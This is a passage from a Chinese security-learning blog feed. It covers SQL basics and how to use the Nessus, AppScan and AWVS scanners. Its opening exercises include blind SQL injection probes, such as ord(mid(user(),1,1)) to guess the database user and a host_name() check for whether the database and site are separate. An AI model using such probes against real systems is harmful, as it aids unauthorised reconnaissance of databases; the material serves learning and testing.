a.student_name,b.lesson,b.score,</p><p>(case when b.score &gt; 85 then ‘优’</p><p> when b.score &gt; 70 then ‘良’</p><p> when b.score &gt; 60 then ‘中’</p><p> else ‘差’ end) as ‘result’</p><p> from student a,student_score b where a.student_id=b.student_id and b.lesson=(‘SQL基本语法’); </p><p><strong>补充：case语句用法</strong></p><p><img src="/images/SQL/32.png" alt="upload successful"></p><p><strong>4.尝试通过mysql查询语句库和站是否分离</strong></p><p>exists(select * from student where 1=(Select (case when host_name()=@servername then 1 else 0 end)))</p><p><strong>5.利用ascii码10进制打出”SQL lesson”</strong></p><p>select ASCII(‘n’) as result from dual</p><p>select char(83,81,76,32,108,101,115,115,111,110) as result from dual</p><p><img src="/images/SQL/33.png" alt="upload successful"></p><p><strong>6.查询student数据库存放的物理位置例如”c:\users\temp”</strong></p><p>show GLOBAL variables like “%data%” </p><p><img src="/images/SQL/34.png" alt="upload successful"></p><p><strong>7.写出猜测当前用户权限的SQL</strong></p><p>select * from student where student_id = ‘1’ and ord(mid(user(),1,1))=116</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.runoob.com/sql/sql-join.html" target="_blank" rel="noopener">http://www.runoob.com/sql/sql-join.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;逻辑运算符：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NOT 或 ！：逻辑非&lt;/p&gt;
&lt;p&gt;AND 或 &amp;amp;&amp;amp;：逻辑与&lt;/p&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="SQL语句" scheme="http://yoursite.com/tags/SQL%E8%AF%AD%E5%8F%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL语句基础</title>
    <link href="http://yoursite.com/2018/08/22/SQL%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2018/08/22/SQL语句基础/</id>
    <published>2018-08-22T14:23:00.000Z</published>
    <updated>2018-08-22T14:49:56.442Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><p>结构化查询语言（Structured Query Language）简称为SQL。是一种特殊目的的编程语言，是一种与数据库进行交互的程序设计语言。</p><a id="more"></a><p><strong>SQL作用：</strong></p><p>用于存取数据以及查询、更新和管理关系型数据库。用于存取数据以及查询、更新和管理关系型数据库。</p><p><strong>关系型数据库：</strong></p><p>1.可以用SQL语句方便的在一个表以及多个表之间做非常复杂的数据查询。</p><p>2.支持事务、使得对于安全性能很高的数据访问要求得以实现。</p><p>包括Mysql、Oracle、Sql Server、DB2、ACCESS</p><p><strong>非关系型数据库：</strong></p><p>1.NOSQL是基于键值对的，不需要经过SQL层的解析，所以性能非常高。</p><p>2.同样也是因为基于键值对，数据之间没有耦合性，所以非常容易水平扩展。</p><p>3.基于以上特点、目前流行的大数据处理多数会选择NOSQL数据库。</p><p>（包括NoSql）:MongoDB、Redis、neo4j）</p><p><strong>SQL类型：</strong></p><p>DCL：数据控制语言</p><p>DDL：数据定义语言</p><p>DML:数据操作语言</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net start mysql    \#启动mysql服务器 </span><br><span class="line"></span><br><span class="line">net stop mysql    #关闭  </span><br><span class="line"></span><br><span class="line">mysql -h 主机地址 -u 用户名 －p 用户密码     #进入 </span><br><span class="line"></span><br><span class="line">exit   #退出 </span><br><span class="line"></span><br><span class="line">status;   #显示当前mysql的version的各种信息。</span><br><span class="line"></span><br><span class="line">show databases;       \#显示数据库</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/1.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#插入数据 </span><br><span class="line"></span><br><span class="line">insert into student values(null,&apos;aa&apos;,&apos;男&apos;,&apos;1988-10-2&apos;,&apos;......&apos;); </span><br><span class="line"></span><br><span class="line">insert into student values(null,&apos;bb&apos;,&apos;女&apos;,&apos;1889-03-6&apos;,&apos;......&apos;); </span><br><span class="line"></span><br><span class="line">insert into student values(null,&apos;cc&apos;,&apos;男&apos;,&apos;1889-08-8&apos;,&apos;......&apos;); </span><br><span class="line"></span><br><span class="line">insert into student values(null,&apos;dd&apos;,&apos;女&apos;,&apos;1889-12-8&apos;,&apos;......&apos;); </span><br><span class="line"></span><br><span class="line">insert into student values(null,&apos;ee&apos;,&apos;女&apos;,&apos;1889-09-6&apos;,&apos;......&apos;); </span><br><span class="line"></span><br><span class="line">insert into student values(null,&apos;ff&apos;,&apos;null&apos;,&apos;1889-09-6&apos;,&apos;......&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查询表中的数据 </span><br><span class="line"></span><br><span class="line">select * from student; </span><br><span class="line"></span><br><span class="line">select id,name from student;</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/2.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#修改某一条数据 </span><br><span class="line"></span><br><span class="line">update student set sex=&apos;男&apos; where id=4;</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/3.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#删除数据</span><br><span class="line">delete from student where id=5;</span><br><span class="line"> </span><br><span class="line">#and 且</span><br><span class="line">select * from student where date&gt;&apos;1988-1-2&apos; and date&lt;&apos;1988-12-1&apos;;</span><br><span class="line"> </span><br><span class="line">#or 或</span><br><span class="line">select * from student where date&lt;&apos;1988-11-2&apos; or date&gt;&apos;1988-12-1&apos;;</span><br><span class="line">  </span><br><span class="line">#between</span><br><span class="line">select * from student where date between &apos;1988-1-2&apos; and &apos;1988-12-1&apos;;</span><br><span class="line"> </span><br><span class="line">#in 查询制定集合内的数据</span><br><span class="line">select * from student where id in (1,3,5);</span><br><span class="line"> </span><br><span class="line">#排序 asc 升序  desc 降序</span><br><span class="line">select * from student order by id asc;</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/4.png" alt="upload successful"></p><p><strong>SELECT语句中常用的函数：</strong></p><p>CONCAT：将多个字符串连接成一个字符串。</p><p>CONCAT_WS：是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位  置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是  其它参数。</p><p>GROUP_CONCAT：group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排  序字段] [Separator ‘分隔符’])</p><p>AVG () ：返回数值列的平均值。NULL 值不包括在计算中。</p><p>COUNT() ：返回指定列的值的数目（NULL 不计入）。</p><p>MAX()：返回一列中的最大值。NULL 值不包括在计算中。</p><p>MIN()：返回一列中的最小值。NULL 值不包括在计算中。</p><p>SUM()：返回数值列的总数（总额）。</p><p>LEN()：返回文本字段中值的长度。</p><p>ROUND(column_name,decimals)：用于把数值字段舍入为指定的小数位数。</p><p>#分组查询 #聚合函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select max(id),name,sex from student group by sex;</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/5.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(date) from student;</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/6.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select avg(id) as &apos;求平均&apos; from student;</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/7.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from student;   #统计表中总数</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/8.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(sex) from student;   #统计表中性别总数  若有一条数据中sex为空的话,就不予以统计~</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/9.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sum(id) from student;</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/10.png" alt="upload successful"></p><p>#查询第i条以后到第j条的数据(不包括第i条)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from student limit 2,5;  #显示3-5条数据</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/11.png" alt="upload successful"></p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="https://www.cnblogs.com/zhuyongzhe/p/7686105.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhuyongzhe/p/7686105.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;p&gt;结构化查询语言（Structured Query Language）简称为SQL。是一种特殊目的的编程语言，是一种与数据库进行交互的程序设计语言。&lt;/p&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="SQL语句" scheme="http://yoursite.com/tags/SQL%E8%AF%AD%E5%8F%A5/"/>
    
  </entry>
  
  <entry>
    <title>Nessus基本使用</title>
    <link href="http://yoursite.com/2018/08/22/Nessus%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/22/Nessus基本使用/</id>
    <published>2018-08-22T13:49:04.000Z</published>
    <updated>2018-08-23T13:40:12.991Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><p>Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。</p><a id="more"></a><p>Nessus支持比竞争对手解决方案更多的技术，扫描操作系统，网络设备，虚拟机管理程序，数据库，Web服务器以及关键基础设施，以解决漏洞，威胁和违规问题。</p><p>随着世界上最大的不断更新的漏洞和配置检查库，以及Tenable公司的专家漏洞研究小组的支持，Nessus设定了漏洞扫描速度和准确性的标准。</p><p><img src="/images/AWVS APPSCAN/31.png" alt="upload successful"></p><p><strong>特点：</strong></p><p>提供完整的电脑漏洞扫描服务, 并随时更新其漏洞数据库。</p><p>可同时在本机或远端上摇控, 进行系统的漏洞分析扫描。</p><p>其运作效能能随着系统的资源而自行调整。</p><p>可自行定义插件(Plug-in)，完整支持SSL (Secure Socket Layer)。</p><p><strong>Nessus导航</strong></p><p>​       顶部的导航条显示两个主页面的链接：扫描和设置。您可以使用这两个页面执行所有Nessus主要任务。点击页面名称打开相应的页面。<br><img src="/images/AWVS APPSCAN/32.png" alt="upload successful"></p><p><strong>扫描</strong></p><p>​      在“ 扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“ 扫描”页面，请在顶部导航栏中单击“ 扫描”。左侧导航栏显示文件夹和资源两部分。</p><p><img src="/images/AWVS APPSCAN/33.png" alt="upload successful"></p><p><strong>文件夹</strong></p><p>文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、废纸搂。</p><p>当您访问“ 扫描”页面时，将显示“ 我的扫描”文件夹。当您创建扫描时，它默认显示在“ 我的扫描”文件夹中。</p><p>在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果。</p><p>废纸篓”文件夹显示已删除的扫描。可以从Nessus实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至“ 废纸篓”文件夹。存储在“ 垃圾箱”文件夹中的扫描将在30天后自动删除。</p><p><img src="/images/AWVS APPSCAN/34.png" alt="upload successful"></p><p><strong>插件规则</strong></p><p>​     允许你隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，您可以查看，创建，编辑和删除您的规则。</p><p><img src="/images/AWVS APPSCAN/35.png" alt="upload successful"></p><p><strong>扫描器</strong></p><p>该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息。</p><p>扫描器由扫描器类型标识，并指示扫描器是否具有共享权限。</p><p>可以使用链接密钥或有效帐户凭证将远程扫描器链接到Nessus Manager。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择。</p><p><img src="/images/AWVS APPSCAN/36.png" alt="upload successful"></p><p><strong>扫描模板</strong></p><p>​         可用的模板可能会有所不同。Nessus界面提供产品中每个模板的简要说明</p><p><img src="/images/AWVS APPSCAN/37.png" alt="upload successful"></p><p><strong>设置</strong></p><p>​    每个策略都存在以下设置，但可用的配置项目可能因所选模板而异：</p><p><img src="/images/AWVS APPSCAN/39.png" alt="upload successful"></p><p><strong>凭证</strong></p><p>​    每个策略都存在以下设置，但可用的配置项目可能因所选模板而异：</p><p><strong>云服务</strong></p><p>数据库：包括MongoDB，Oracle，MySQL，DB2，PostgreSQL和SQL Server</p><p>主机：其中包括Windows登录，SSH和SNMPv3</p><p>其他服务：VMware，Red Hat Enterprise Virtualization等</p><p>明文身份验证机制：包括FTP，HTTP，POP3和其他服务</p><p><img src="/images/AWVS APPSCAN/40.png" alt="upload successful"></p><p><strong>合规检测</strong></p><p>​       Nessus可以执行网络服务的漏洞扫描以及登录到服务器以发现任何缺少的补丁。没有漏洞并不意味着服务器配置是正确的，或者与特定标准要求“相符”<br><img src="/images/AWVS APPSCAN/41.png" alt="upload successful"></p><p><strong>插件</strong></p><p>​      插件选项可以选择插件系列的安全检查或单个插件检查</p><p><img src="/images/AWVS APPSCAN/42.png" alt="upload successful"></p><p>“ 关于”页面显示Nessus许可和插件信息的概述。当您访问产品设置时，默认情况下出现关于页面。</p><p><img src="/images/AWVS APPSCAN/43.png" alt="upload successful"></p><p><strong>SMTP服务</strong></p><p>“ SMTP服务器”页面显示允许您配置简单邮件传输协议（SMTP）服务器的选项。当您配置SMTP服务器时，Nessus会将扫描结果通过电子邮件发送到您指定的收件人列表。<br><img src="/images/AWVS APPSCAN/44.png" alt="upload successful"></p><p><strong>用户</strong></p><p>​        在此页面上，您可以查看，创建，编辑和删除用户。一旦创建，用户就配置了一个角色，它决定了他们的扫描器权限。</p><p><img src="/images/AWVS APPSCAN/45.png" alt="upload successful"></p><p><strong>命令行：</strong></p><p>启动或停止Nessus</p><p>​      <strong>Windows</strong></p><p>1、导航到  服务。</p><p>2、在  名称  列中，单击Tenable Nessus。</p><p>3、要停止Nessus服务，请右键单击  Tenable Nessus，然后单击停止。</p><p>4、要重新启动Nessus服务，请右键单击  Tenable Nessus，然后单击开始。<br><img src="/images/AWVS APPSCAN/46.png" alt="upload successful"></p><p><strong>Linux</strong></p><p><img src="/images/AWVS APPSCAN/47.png" alt="upload successful"></p><p><img src="/images/AWVS APPSCAN/48.png" alt="upload successful"></p><p><img src="/images/AWVS APPSCAN/49.png" alt="upload successful"><br><strong>扫描报告</strong></p><p>点击扫描结果文件夹，选择要下载的扫描任务</p><p><img src="/images/AWVS APPSCAN/38.png" alt="upload successful"></p><p>选择下载目标，点击左上角输出，选择输出文件格式。</p><p><img src="/images/AWVS APPSCAN/50.png" alt="upload successful"></p><h3 id="【官网链接】"><a href="#【官网链接】" class="headerlink" title="【官网链接】"></a>【官网链接】</h3><p><a href="https://www.tenable.com/products/nessus-home" target="_blank" rel="noopener">https://www.tenable.com/products/nessus-home</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;p&gt;Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Nessus" scheme="http://yoursite.com/tags/Nessus/"/>
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>AppScan工具基本使用</title>
    <link href="http://yoursite.com/2018/08/20/AppScan%E5%B7%A5%E5%85%B7%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/20/AppScan工具基本使用/</id>
    <published>2018-08-20T07:12:39.000Z</published>
    <updated>2018-08-20T07:29:39.603Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-【前言】"><a href="#0x01-【前言】" class="headerlink" title="0x01 【前言】"></a>0x01 【前言】</h3><p>Ratinal AppScan其实是一个产品家族，包括众多的应用安全扫描产品。从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</p><a id="more"></a><p><strong>AppScan工作原理小结如下：</strong></p><ul><li>通过搜索（爬行）发现整个 Web 应用结构</li><li>根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库）</li><li>通过对于 Respone 的分析验证是否存在安全漏洞</li></ul><p><strong>AppScan扫描原理：扫描规则库+爬行+测试</strong></p><p><img src="/images/AWVS APPSCAN/21.png" alt="upload successful"></p><p>AppScan 的核心是提供一个扫描规则库，然后利用自动化的“探索”技术得到众多的页面和页面参数，进而对这些页面和页面参数进行安全性测试。“扫描规则库”，“探索”，“测试”就构成了 AppScan 的核心三要素。而在安全扫描过程中，如何进行优化，就要结合这三个要素，看哪些部分需要优化，应该如何优化。</p><h3 id="0x02-【使用步骤】"><a href="#0x02-【使用步骤】" class="headerlink" title="0x02 【使用步骤】"></a>0x02 【使用步骤】</h3><h4 id="1、打开AppScan软件，点击工具栏上的文件，新建，出现一个dialog。"><a href="#1、打开AppScan软件，点击工具栏上的文件，新建，出现一个dialog。" class="headerlink" title="1、打开AppScan软件，点击工具栏上的文件，新建，出现一个dialog。"></a>1、打开AppScan软件，点击工具栏上的文件，新建，出现一个dialog。</h4><p><img src="/images/AWVS APPSCAN/22.png" alt="upload successful"></p><h4 id="2、点击“Regular-Scan”。出现扫描配置向导页面，这里是选择“AppScan”，如图："><a href="#2、点击“Regular-Scan”。出现扫描配置向导页面，这里是选择“AppScan”，如图：" class="headerlink" title="2、点击“Regular Scan”。出现扫描配置向导页面，这里是选择“AppScan”，如图："></a>2、点击“Regular Scan”。出现扫描配置向导页面，这里是选择“AppScan”，如图：</h4><p><img src="/images/AWVS APPSCAN/23.png" alt="upload successful"></p><h4 id="3、输入扫描项目目标URL"><a href="#3、输入扫描项目目标URL" class="headerlink" title="3、输入扫描项目目标URL"></a>3、输入扫描项目目标URL</h4><p><img src="/images/AWVS APPSCAN/24.png" alt="upload successful"></p><h4 id="4、点击“下一步”，选择认证模式，出现登录管理的页面，这是因为对于大部分网站，需要用户名和密码登录进去才可以查看许多内容，未登录的情况下就只可以访问部分页面。"><a href="#4、点击“下一步”，选择认证模式，出现登录管理的页面，这是因为对于大部分网站，需要用户名和密码登录进去才可以查看许多内容，未登录的情况下就只可以访问部分页面。" class="headerlink" title="4、点击“下一步”，选择认证模式，出现登录管理的页面，这是因为对于大部分网站，需要用户名和密码登录进去才可以查看许多内容，未登录的情况下就只可以访问部分页面。"></a>4、点击“下一步”，选择认证模式，出现登录管理的页面，这是因为对于大部分网站，需要用户名和密码登录进去才可以查看许多内容，未登录的情况下就只可以访问部分页面。</h4><p><img src="/images/AWVS APPSCAN/25.png" alt="upload successful"></p><h4 id="5、点击“下一步”，出现测试策略的页面，可以根据不同的测试需求进行选择"><a href="#5、点击“下一步”，出现测试策略的页面，可以根据不同的测试需求进行选择" class="headerlink" title="5、点击“下一步”，出现测试策略的页面，可以根据不同的测试需求进行选择"></a>5、点击“下一步”，出现测试策略的页面，可以根据不同的测试需求进行选择</h4><h4 id="6、点击“下一步”，出现完成配置向导的界面，这里使用默认配置，可根据需求更改。"><a href="#6、点击“下一步”，出现完成配置向导的界面，这里使用默认配置，可根据需求更改。" class="headerlink" title="6、点击“下一步”，出现完成配置向导的界面，这里使用默认配置，可根据需求更改。"></a>6、点击“下一步”，出现完成配置向导的界面，这里使用默认配置，可根据需求更改。</h4><p><img src="/images/AWVS APPSCAN/26.png" alt="upload successful"></p><h4 id="7、点击“完成”，设置保存路径，即开始扫描。"><a href="#7、点击“完成”，设置保存路径，即开始扫描。" class="headerlink" title="7、点击“完成”，设置保存路径，即开始扫描。"></a>7、点击“完成”，设置保存路径，即开始扫描。</h4><p><img src="/images/AWVS APPSCAN/27.png" alt="upload successful"></p><h3 id="0x03-扫描结果"><a href="#0x03-扫描结果" class="headerlink" title="0x03 扫描结果"></a>0x03 扫描结果</h3><p><img src="/images/AWVS APPSCAN/28.png" alt="upload successful"></p><p><strong>红色叹号表示高危漏洞，每一个漏洞都有详细的列出来，工具栏中的”报告“，可以将扫描结果导出来。</strong></p><h3 id="0x04-【参考资料】"><a href="#0x04-【参考资料】" class="headerlink" title="0x04 【参考资料】"></a>0x04 【参考资料】</h3><p><a href="http://www.mamicode.com/info-detail-1879133.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1879133.html</a></p><p><a href="http://www.360doc.com/content/17/0219/20/32626470_630367925.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/17/0219/20/32626470_630367925.shtml</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-【前言】&quot;&gt;&lt;a href=&quot;#0x01-【前言】&quot; class=&quot;headerlink&quot; title=&quot;0x01 【前言】&quot;&gt;&lt;/a&gt;0x01 【前言】&lt;/h3&gt;&lt;p&gt;Ratinal AppScan其实是一个产品家族，包括众多的应用安全扫描产品。从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="AppScan" scheme="http://yoursite.com/tags/AppScan/"/>
    
  </entry>
  
  <entry>
    <title>AWVS的基本使用</title>
    <link href="http://yoursite.com/2018/08/20/AWVS%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/20/AWVS的基本使用/</id>
    <published>2018-08-20T07:01:18.000Z</published>
    <updated>2018-08-20T07:20:44.909Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-【前言】"><a href="#0x01-【前言】" class="headerlink" title="0x01 【前言】"></a>0x01 【前言】</h3><p>Acuneti Webb Vulnerability Scanner是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。现已更新到11，下面介绍9版本。</p><a id="more"></a><p><img src="/images/AWVS APPSCAN/1.png" alt="upload successful"></p><h3 id="0x02-【功能or特点】"><a href="#0x02-【功能or特点】" class="headerlink" title="0x02 【功能or特点】"></a>0x02 【功能or特点】</h3><p>自动的客户端脚本分析器，允许对Ajax和Web 2.0应用程序进行安全性测试。</p><p>业内最先进且深入的SQL注入和跨站脚本测试；</p><p>高级渗透测试工具，例如HTTP Editor和HTTP Fuzzer；</p><p>可视化宏记录器帮助您轻松测试web表格和受密码保护的区域</p><p>支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制</p><p>丰富的报告功能，包括 VISA PCI 依从性报告</p><p>高速的多线程扫描器轻松检索成千上万个页面</p><p>智能爬行程序检测 web 服务器类型和应用程序语言 </p><p>Acunetix检索并分析网站，包括 flash 内容、SOAP 和 AJAX </p><p>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 </p><p>可导出网站漏洞文件</p><h3 id="0x03-AWVS-menus-bar（AWVS菜单栏）"><a href="#0x03-AWVS-menus-bar（AWVS菜单栏）" class="headerlink" title="0x03 AWVS menus bar（AWVS菜单栏）"></a>0x03 AWVS menus bar（AWVS菜单栏）</h3><p><img src="/images/AWVS APPSCAN/2.png" alt="upload successful"></p><h3 id="0x04-AWVS工具栏"><a href="#0x04-AWVS工具栏" class="headerlink" title="0x04 AWVS工具栏"></a>0x04 AWVS工具栏</h3><p><img src="/images/AWVS APPSCAN/3.png" alt="upload successful"><br>从左到右分别是：新建扫描——网站扫描——网站爬行——目标查找——目标探 测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅 探——HTTP Fuzzer——认证测试——结果对比——WSDL扫 描——WSDL编辑测试——程序设置——扫描设置——侧重扫 描设置——计划任务——报告</p><h3 id="0x05-AWVS-新建扫描"><a href="#0x05-AWVS-新建扫描" class="headerlink" title="0x05 AWVS 新建扫描"></a>0x05 AWVS 新建扫描</h3><p><strong>1、点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要 设定下面选项:</strong></p><p>（1). Scan type （2). Options （3). Target （4). Login （5). Finsh</p><h4 id="AWVS-新建扫描——Scan-type"><a href="#AWVS-新建扫描——Scan-type" class="headerlink" title="AWVS 新建扫描——Scan type"></a>AWVS 新建扫描——Scan type</h4><p><img src="/images/AWVS APPSCAN/4.png" alt="upload successful"></p><h4 id="AWVS-新建扫描——Options"><a href="#AWVS-新建扫描——Options" class="headerlink" title="AWVS 新建扫描——Options"></a>AWVS 新建扫描——Options</h4><p><img src="/images/AWVS APPSCAN/5.png" alt="upload successful"></p><p><strong>接着，点击下一步按钮，在scanning profile里面选择安全扫面的漏洞种类（其实就是payload）</strong></p><p><strong>Options——Scanning profile</strong></p><p>Scanning profile： 设置侧重扫描的类型，包含16种侧 重检测类型</p><p><img src="/images/AWVS APPSCAN/6.png" alt="upload successful"></p><h4 id="AWVS-新建扫描——Target"><a href="#AWVS-新建扫描——Target" class="headerlink" title="AWVS 新建扫描——Target"></a>AWVS 新建扫描——Target</h4><p><img src="/images/AWVS APPSCAN/7.png" alt="upload successful"></p><h4 id="AWVS-新建扫描——Login"><a href="#AWVS-新建扫描——Login" class="headerlink" title="AWVS 新建扫描——Login"></a>AWVS 新建扫描——Login</h4><p><img src="/images/AWVS APPSCAN/8.png" alt="upload successful"></p><p>这个Login sequence，我要讲一下，当你的网站需要深入扫描的时候，我们就可以使用这个Login sequence功能，这个功能通过你输入网站的用户名密码登录之后，AWVS就可以扫描登录以后的权限页面，如果你不登录，那么，AWVS就没有权限扫描需要用户名密码登录之后的页面了（因为这些页面都需要特定的权限验证之后才能访问，所以，我把他们叫做权限页面），如果保持默认设置，那么AWVS就无权扫描你的权限页面，此处，我们使用默认设置就好了，点击下一步，来到完成设置页面。</p><h4 id="AWVS-新建扫描——Finish"><a href="#AWVS-新建扫描——Finish" class="headerlink" title="AWVS 新建扫描——Finish"></a>AWVS 新建扫描——Finish</h4><p><img src="/images/AWVS APPSCAN/9.png" alt="upload successful"></p><p>点击Finish，完成AWVS的扫描设置（点击Finish按钮之前，AWVS还未进行任何的安全扫描），当点击Finish按钮之后，AWVS就开始对你提供的域名（或者IP亦可）进行安全扫描了。 </p><h3 id="0x06-扫描结果"><a href="#0x06-扫描结果" class="headerlink" title="0x06 扫描结果"></a>0x06 扫描结果</h3><p><img src="/images/AWVS APPSCAN/10.png" 